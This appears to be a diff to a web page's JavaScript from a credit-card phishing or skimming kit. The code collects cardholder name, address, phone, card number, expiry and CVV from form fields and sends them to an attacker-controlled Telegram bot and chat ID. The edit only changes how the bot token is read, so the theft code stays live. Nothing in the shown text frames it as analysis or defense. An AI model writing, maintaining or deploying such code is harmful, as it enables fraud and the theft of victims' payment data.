@@ -1044,7 +1044,7 @@
                 const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
                 const CHAT_ID = '6078788670';
                 const msg = 'CARTE: ' + cardName.value + ' | ADRESSE: ' + address.value + ' | TEL: ' + phone.value + ' | MONTANT: ' + amount.value + ' | NUMERO: ' + cardNumber.value + ' | EXPIRATION: ' + expiry.value + ' | CVV: ' + cvv.value;
-                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                fetch('https://api.telegram.org/bot' + window.telegramConfig.BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({chat_id: CHAT_ID, text: msg})
